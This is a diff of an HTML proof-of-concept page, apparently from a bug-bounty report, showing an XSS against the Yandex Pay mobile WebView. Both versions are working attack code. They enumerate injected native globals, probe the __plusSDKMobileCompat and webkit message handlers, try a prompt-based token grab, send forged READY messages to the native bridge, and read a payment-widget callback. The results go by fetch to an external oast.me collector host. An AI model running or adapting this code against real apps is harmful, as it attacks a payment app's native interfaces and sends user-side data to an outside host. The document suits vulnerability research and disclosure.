@@ -1,91 +1,61 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// Comprehensive probe: find ALL non-standard window properties and try every
-// possible way to send messages to native
+// CONFIRMED: __plusSDKMobileCompat.onMessage() sends to native via
+// webkit.messageHandlers.__plusSDKMobileCompat_onMessage.postMessage(data)
+//
+// The READY message type from Android code: @SerialName("READY") with trackId field
+// Let's try various formats
 
-var data = {};
+var attempts = [
+  '{"type":"READY","trackId":"12345678-1234-1234-1234-123456789abc"}',
+  '{"type":"READY"}',
+  '{"type":"ready","trackId":"12345678-1234-1234-1234-123456789abc"}',
+  '{"type":"READY_FOR_MESSAGING","trackId":"12345678-1234-1234-1234-123456789abc"}',
+  '{"type":"PAGE_READY"}',
+  '{"type":"SDK_READY"}',
+  '{"event":"READY"}',
+  '{"action":"READY"}',
+  '{"message":"READY","trackId":"12345678-1234-1234-1234-123456789abc"}',
+  'READY',
+];
 
-// 1. Find all non-default window properties (native injections)
-var defaultProps = ["location","document","window","self","top","parent","frames","opener","closed","length","name","history","customElements","locationbar","menubar","personalbar","scrollbars","statusbar","toolbar","status","frameElement","navigator","clientInformation","screen","innerWidth","innerHeight","scrollX","pageXOffset","scrollY","pageYOffset","screenX","screenLeft","screenY","screenTop","outerWidth","outerHeight","devicePixelRatio","performance","origin","isSecureContext","crypto","close","focus","blur","postMessage","stop","open","alert","confirm","prompt","print","find","scroll","scrollTo","scrollBy","getComputedStyle","matchMedia","moveTo","moveBy","resizeTo","resizeBy","getSelection","reportError","atob","btoa","setTimeout","clearTimeout","setInterval","clearInterval","queueMicrotask","createImageBitmap","structuredClone","fetch","caches","indexedDB","sessionStorage","localStorage"];
+var results = [];
 
-var injected = [];
-for (var k in window) {
-  if (defaultProps.indexOf(k) === -1 && k.indexOf("on") !== 0 && k.indexOf("webkit") !== 0) {
-    try {
-      var val = window[k];
-      var info = {name: k, type: typeof val};
-      if (typeof val === 'object' && val !== null) {
-        info.keys = Object.keys(val);
-        info.ownProps = Object.getOwnPropertyNames(val);
-      }
-      if (typeof val === 'function') {
-        info.str = val.toString().substring(0, 200);
-      }
-      injected.push(info);
-    } catch(e) {
-      injected.push({name: k, error: e.message});
-    }
+attempts.forEach(function(msg, i) {
+  try {
+    window.__plusSDKMobileCompat.onMessage(msg);
+    results.push(i + ":sent:" + msg.substring(0,30));
+  } catch(e) {
+    results.push(i + ":err:" + e.message);
   }
-}
-data.injectedGlobals = injected;
+});
 
-// 2. Check webkit.messageHandlers thoroughly
-data.webkitInfo = {};
+// Also try calling the handler directly
 try {
-  var wk = window.webkit;
-  data.webkitInfo.exists = !!wk;
-  data.webkitInfo.keys = Object.keys(wk || {});
-  data.webkitInfo.ownProps = Object.getOwnPropertyNames(wk || {});
-  if (wk && wk.messageHandlers) {
-    data.webkitInfo.mhExists = true;
-    data.webkitInfo.mhKeys = Object.keys(wk.messageHandlers);
-    data.webkitInfo.mhOwnProps = Object.getOwnPropertyNames(wk.messageHandlers);
-    // Try to access common handler names and see which throw vs return undefined
-    var handlers = ["plus","plusSDK","native","nativeYB","bridge","app","sdk","message",
-      "ready","READY","compat","plusCompat","plusMobileCompat","smartWebview",
-      "PlusHomeSDK","plusHomeSDK","fintech","bank","payment","webview",
-      "callNative","jsbridge","YBridge","ybridge","plusBridge"];
-    var foundHandlers = [];
-    handlers.forEach(function(h) {
-      try {
-        var handler = wk.messageHandlers[h];
-        if (handler) foundHandlers.push(h + ":EXISTS");
-      } catch(e) {
-        // TypeError = doesn't exist, other errors = might exist
-        if (e.name !== "TypeError") foundHandlers.push(h + ":err:" + e.message);
-      }
-    });
-    data.webkitInfo.foundHandlers = foundHandlers;
-  }
+  window.webkit.messageHandlers.__plusSDKMobileCompat_onMessage.postMessage('{"type":"READY","trackId":"test123"}');
+  results.push("direct:sent");
 } catch(e) {
-  data.webkitInfo.error = e.message;
+  results.push("direct:err:" + e.message);
 }
 
-// 3. Try prompt() - some iOS WebViews intercept prompt for communication
+// Check if there's also a __webviewPaymentWidget equivalent
 try {
-  var promptResult = prompt("__PLUS_SDK_GET_TOKEN__");
-  data.promptResult = promptResult;
+  var payStr = window.__webviewPaymentWidget.onEvent.toString();
+  results.push("payBridge:" + payStr.substring(0,150));
 } catch(e) {
-  data.promptError = e.message;
+  results.push("payBridge:err:" + e.message);
 }
 
-// 4. Check if there's a custom URL scheme handler by monitoring
-data.plusSDKCompat = {};
-try {
-  var sdk = window.__plusSDKMobileCompat;
-  data.plusSDKCompat.type = typeof sdk;
-  data.plusSDKCompat.keys = Object.keys(sdk);
-  data.plusSDKCompat.ownProps = Object.getOwnPropertyNames(sdk);
-  data.plusSDKCompat.onMessageType = typeof sdk.onMessage;
-  // Check if onMessage is a native function or JS function
-  data.plusSDKCompat.onMessageStr = (sdk.onMessage || "").toString ? sdk.onMessage.toString().substring(0, 200) : "no toString";
-} catch(e) {
-  data.plusSDKCompat.error = e.message;
-}
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/ready-attempts?" + encodeURIComponent(JSON.stringify(results)));
 
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/full-probe?" + encodeURIComponent(JSON.stringify(data)));
-document.title = "Probed: " + (injected.length) + " injected globals";
+// Wait and check if overlay dismissed
+setTimeout(function(){
+  // Try to render content - if visible, overlay is gone
+  document.body.style.background = '#111';
+  document.body.innerHTML = '<div style="padding:40px;text-align:center;font-family:-apple-system;color:#fff;min-height:100vh;"><h1 style="color:#fc0;">XSS in Yandex Pay</h1><p>If you can see this, the overlay was dismissed.</p><p>r4dl3 PoC</p></div>';
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/content-rendered?visible=check");
+}, 3000);
 </script>
 </body>
 </html>
